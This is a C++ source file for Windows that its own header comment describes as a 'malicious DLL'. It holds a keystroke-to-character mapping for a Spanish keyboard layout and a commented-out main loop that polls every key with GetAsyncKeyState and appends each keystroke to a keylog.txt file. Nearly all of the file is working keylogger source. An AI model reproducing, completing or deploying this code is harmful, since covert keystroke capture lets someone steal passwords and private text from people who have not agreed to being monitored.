#include <iostream>
#include <fstream>
#include <windows.h>

/*
THIS FILE WILL BE THE MALICIOUS DLL
*/

char getCharFromKey(int key, bool shiftPressed, bool altGrPressed) {
   
    if (key >= 'A' && key <= 'Z') {
        bool capsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        if (shiftPressed ^ capsLockActive) return key; 
        else return key + 32; 
    }

  
    if (key >= '0' && key <= '9') {
        if (shiftPressed) {
            static const char shiftNumbers[] = { '=', '!', '\"', '·', '$', '%', '&', '/', '(', ')', '?' };
            return shiftNumbers[key - '0'];
        }
        else if (altGrPressed) {
           
            static const char altGrNumbers[] = { '|', '@', '#', '~', '€', '[', ']', '{', '}', '\\', '|' };
            return altGrNumbers[key - '0'];
        }
        return key; 
    }

    if (shiftPressed) {
        switch (key) {
           
        case VK_OEM_1: return 'Ñ';
        case VK_OEM_PLUS: return '*';
        case VK_OEM_COMMA: return ';';
        case VK_OEM_MINUS: return '_';
        case VK_OEM_PERIOD: return ':';
        case VK_OEM_2: return '?';
        case VK_OEM_3: return '^';
        case VK_OEM_4: return '¡';
        case VK_OEM_5: return '€';
        case VK_OEM_6: return '&';
        case VK_OEM_7: return '/';
        case VK_OEM_102: return '>';
         
        default: break;
        }
    }

    if (altGrPressed) {
        switch (key) {
           
        case '2': return '@';
        case '3': return '#';
        case 'E': return '€';
        case '4': return '~';
        case '5': return '½';
        case 'Q': return '\\';
        case 'W': return '|';
        case 'M': return 'µ';
        case 'R': return '¬';
        
        default: break;
        }
    }
    switch (key) {
    case VK_SPACE: return ' ';
    case VK_OEM_1: return 'ñ';
    case VK_OEM_PLUS: return '+';
    case VK_OEM_COMMA: return ',';
    case VK_OEM_MINUS: return '-';
    case VK_OEM_PERIOD: return '.';
    case VK_OEM_2: return '\'';
    case VK_OEM_3: return '`';
    case VK_OEM_4: return '[';
    case VK_OEM_5: return '\\';
    case VK_OEM_6: return ']';
    case VK_OEM_7: return 'ç';
    case VK_OEM_102: return '<';
      
    default: break;
    }

    return 0; 
}

/*
int main() {
    std::ofstream logFile;
    logFile.open("C:\\Users\\Sergio\\Desktop\\keylog.txt", std::ios_base::app);

    bool keysState[256] = { false };

    while (true) {
        Sleep(10);

        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
        bool altGrPressed = GetAsyncKeyState(VK_RMENU) < 0;

        for (int key = 8; key <= 222; key++) {
            short keyState = GetAsyncKeyState(key);

            if ((keyState & 0x8000) && !keysState[key]) {
                char ascii = getCharFromKey(key, shiftPressed, altGrPressed);
                if (ascii != 0) {
                    logFile << ascii;
                    logFile.flush();
                }
                keysState[key] = true;
            }
            else if (!(keyState & 0x8000) && keysState[key]) {
                keysState[key] = false;
            }
        }
    }

    logFile.close();
    return 0;
}*/

